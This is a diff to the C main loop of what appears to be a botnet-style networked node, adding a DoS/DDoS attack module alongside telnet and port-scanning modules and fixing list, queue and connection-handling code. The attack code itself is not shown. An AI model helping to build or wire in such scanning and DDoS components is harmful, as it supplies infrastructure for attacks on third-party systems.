@@ -74,29 +74,38 @@ so nodes can use several communication methods, and irc can be used to control
 #include <unistd.h>
 #include <sys/select.h>
 #include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <stdint.h>
+#include <time.h>
+#include <string.h>
+#include <arpa/inet.h>
 #include "structs.h"
 #include "list.h"
+#include "utils.h"
 
 // crypto currencies:
 // bitcoin = main/parent
 #include "modules/bitcoin/note_bitcoin.h"
 // child of bitcoin - shares same functions
-#include "modules/alt/litecoin/note_litecoin.h"
+#include "modules/bitcoin/alt/litecoin/note_litecoin.h"
 // child of bitcoin - shares same functions
-#include "modules/alt/namecoin/note_namecoin.h"
+#include "modules/bitcoin/alt/namecoin/note_namecoin.h"
 // child of bitcoin - shares same functions
-#include "modules/alt/peercoin/note_peercoin.h"
+#include "modules/bitcoin/alt/peercoin/note_peercoin.h"
 // telnet module
 #include "modules/telnet/telnet.h"
 // port scanning.. (supplies telnet w connections, etc)
 #include "modules/portscan/portscan.h"
+// DoS/DDoS module
+#include "modules/dos/attacks.h"
 
 #define MAX(a, b) ((a) > (b) ? ( a) : (b))
 
 Modules *module_list = NULL;
 
 // prepare fd set / fd & max fds for select()
-void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int *max_fd, int fd) {
+void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int fd, int *max_fd) {
     // set the fd inside of fd_set
     //if (fdset != NULL)
     FD_SET(fd, fdset);
@@ -110,6 +119,7 @@ void setup_fd(fd_set *fdset, fd_set *fdset2, fd_set *fdset3, int *max_fd, int fd
 
 void OutgoingFlush(Connection *cptr) {
     Queue *qptr = NULL;
+    int cur_time = time(0);
     
     // is this a new connection?
     if (cptr->state == TCP_NEW) {
@@ -122,10 +132,7 @@ void OutgoingFlush(Connection *cptr) {
     
     // can write now.. check outgoing queue
     // do we have an outgoing queue to deal with?
-    if (cptr->outgoing != NULL) {
-        // flush it!
-        qptr = cptr->outgoing;
-        
+    if ((qptr = cptr->outgoing) != NULL) {        
         while (qptr != NULL) {
             // outgoing might not write everything first shot..
             int wrote = write(cptr->fd, qptr->buf, qptr->size);
@@ -154,7 +161,19 @@ void OutgoingFlush(Connection *cptr) {
                 break;
             }
         }
-    }    
+    } else {
+        
+        // if its supposed to close after.. lets close it..after timeout
+        if (cptr->state == TCP_CLOSE_AFTER_FLUSH) {
+            if (cptr->ping_ts == 0) {
+                cptr->ping_ts = cur_time;
+            }
+            // give it 20 seconds after flushing
+            if ((cur_time - cptr->ping_ts) > 20)
+                ConnectionBad(cptr);
+                
+        }
+    }
 }
 
 /*
@@ -165,7 +184,7 @@ Connection *ConnectionAdopt(Modules *original, Modules *newhome, Connection *con
     Connection *cptr = NULL;
     int fd = 0;
     
-    if ((cptr = L_add((LIST **)&newhome->connections, sizeof(Connection))) == NULL)
+    if ((cptr = (Connection *)L_add((LIST **)&newhome->connections, sizeof(Connection))) == NULL)
         return NULL;
     
     cptr->addr = conn->addr;
@@ -199,17 +218,13 @@ void ConnectionBad(Connection *cptr) {
             return;
         }
     }
-    
-    // disabling this due to some code maybe reusing cptr ... ill do it in cleanup until further testing
-    if (1==0 && cptr->list) {
-        L_del((LIST **)cptr->list, (LIST *)cptr);
-        
-        return;
-    }
-    
+
     // close socket
-    if (cptr->fd)
+    if (cptr->fd) {
         close(cptr->fd);
+        cptr->fd = 0;
+    }
+        
     // mark for deletion    
     cptr->closed = 1;
     
@@ -324,7 +339,7 @@ void ConnectionRead(Connection *cptr) {
         return;
     }
 
-    if ((newqueue = (Queue *)l_add((LIST **)&cptr->incoming, sizeof(Queue))) == NULL) {
+    if ((newqueue = (Queue *)L_add((LIST **)&cptr->incoming, sizeof(Queue))) == NULL) {
         // error!
         ConnectionBad(cptr);
     }
@@ -340,7 +355,7 @@ void network_main_loop(Modules *mptr) {
     Connection *cptr = NULL;
         
     // loop for each connection under this module..
-    for (cptr = nptr->connections; cptr != NULL; cptr = cptr->next) {
+    for (cptr = mptr->connections; cptr != NULL; cptr = cptr->next) {
         // do we have an incoming queue to deal with?
         if (cptr->incoming != NULL) {
             // lets attempt to merge messages that may be fragmented in the queue
@@ -349,12 +364,12 @@ void network_main_loop(Modules *mptr) {
             for (qptr = cptr->incoming; qptr != NULL; ) {
                 // first we hit our read function..maybe compressed, or encrypted
                 
-                if (nptr->functions->read_ptr != NULL)
-                    nptr->functions->read_ptr(nptr, cptr, &qptr->buf, &qptr->size);
+                if (mptr->functions->read_ptr != NULL)
+                    mptr->functions->read_ptr(mptr, cptr, &qptr->buf, &qptr->size);
                 
                 // parse data w specific note's parser
-                if (nptr->functions->incoming != NULL) {
-                    if (nptr->functions->incoming(nptr, cptr, qptr->buf, qptr->size) < 1) {
+                if (mptr->functions->incoming != NULL) {
+                    if (mptr->functions->incoming(mptr, cptr, qptr->buf, qptr->size) < 1) {
                         // we break since nothing we're looking for is there.. 
                         break;
                     }
@@ -390,7 +405,7 @@ int QueueAdd(Modules *module, Connection *conn, Queue **queue, char *buf, int si
             memcpy(newbuf, buf, size);
 
             // where to add queue.. if we specify use it, otherwise outgoing         
-            if ((newqueue = (Queue *)l_add((LIST **)(queue ? queue : conn->outgoing), sizeof(Queue))) == -1)
+            if ((newqueue = (Queue *)L_add((LIST **)(queue ? queue : &conn->outgoing), sizeof(Queue))) == NULL)
                 return -1;
         
             newqueue->buf = newbuf;   
@@ -450,7 +465,7 @@ int QueueMerge(Queue **queue) {
     char *ptr = NULL;
     
     // no need to merge anything if theres only a single queues    
-    if ((count = l_count(qptr)) < 2) return 0;
+    if ((count = L_count((LIST *)qptr)) < 2) return 0;
     
     // i'll start by merging only 1 at a time.. the msg just wont process if its too short..
     // another loop and it should be fine
@@ -461,7 +476,7 @@ int QueueMerge(Queue **queue) {
         // calculate size of both
         size = qptr->size + qptr2->size;
         
-        if ((buf = malloc(size + 1)) == NULL)
+        if ((buf = (char *)malloc(size + 1)) == NULL)
             return -1;
 
         // copy buffer to new memory location        
@@ -490,7 +505,7 @@ void QueueFree(Queue **qlist) {
 }
 
 bool ASCII_is_endline(unsigned char c) {
-    char *ASCII_characters[] = "\r\n"; //\0";
+    char ASCII_characters[] = "\r\n"; //\0";
     //int i = 0;
     
     return (ASCII_characters[0] == c || ASCII_characters[1] == c);
@@ -509,7 +524,7 @@ bool ASCII_is_endline(unsigned char c) {
 char *ASCIIcopy(char *src, int size) {
     char *ret = NULL;
     
-    if ((ret = malloc(size + 1)) != NULL) {
+    if ((ret = (char *)malloc(size + 1)) != NULL) {
         memcpy(ret, src, size);
     }
     
@@ -599,7 +614,7 @@ int tcp_connect(Modules *note, Connection **connections, uint32_t ip, int port, 
     
     // if we are reusing a structure.. do it otherwise create a new
     if (*_conn == NULL)
-        cptr = (Connection *)l_add((LIST **)note->connections, sizeof(Connection));
+        cptr = (Connection *)L_add((LIST **)note->connections, sizeof(Connection));
     else
         cptr = *_conn;
         
@@ -641,7 +656,6 @@ int tcp_connect(Modules *note, Connection **connections, uint32_t ip, int port, 
 }
 
 
-
 // we will use a simple main in the beginning...
 // i want this to be a library, or a very simple node
 int main(int argc, char *argv[]) {
@@ -655,6 +669,8 @@ int main(int argc, char *argv[]) {
     portscan_init(&module_list);
     // ensure any following modules enable portscans in init
     telnet_init(&module_list);
+    // initialize module for (D)DoS
+    attack_init(&module_list);
     
     // main loop
     while (1) {
